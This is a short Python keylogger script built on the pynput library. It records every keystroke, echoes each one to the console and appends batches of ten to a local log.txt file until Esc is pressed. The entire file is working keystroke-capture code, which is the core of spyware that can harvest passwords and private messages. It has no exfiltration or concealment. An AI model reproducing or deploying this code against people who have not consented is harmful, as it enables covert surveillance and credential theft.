import pynput
from pynput.keyboard import Key,Listener
count=0
keys=[]

def on_press (key):                             #Function when key is pressed
    global keys,count
    keys.append(key)                            #addding a key listened on keyboard in the blank list
    count+=1                                    #count each key added to list
    
    print("{0} key pressed".format(key))

    if count>=10:                               #check if count is 10
        count=0 
        for i in keys:                                #reset count
            write_file(str(i))                   #write all the 10 keys recoreded in keys list into log.txt file by calling the write_file function
        keys=[]                                 #after loading log.txt reset the list to take new 10 keys

def on_release (key):                           #Function when key is released
    if key==Key.esc:                            #escape the loop when escape key is pressed
        return False

def write_file(keys):                           #Write keys into file
    with open("log.txt", "a") as f:             #open file log.txt in write mode 
        for key in keys:                        #for each key in keys list print in log.txt
            k = str(key).replace("'","")        #remove the quatation marks
                       
            f.write(str(k)) 
        f.write('\n')   
            
          
with Listener(on_press = on_press, on_release = on_release) as listener : #calling on_press on_release function as listener#
    listener.join()
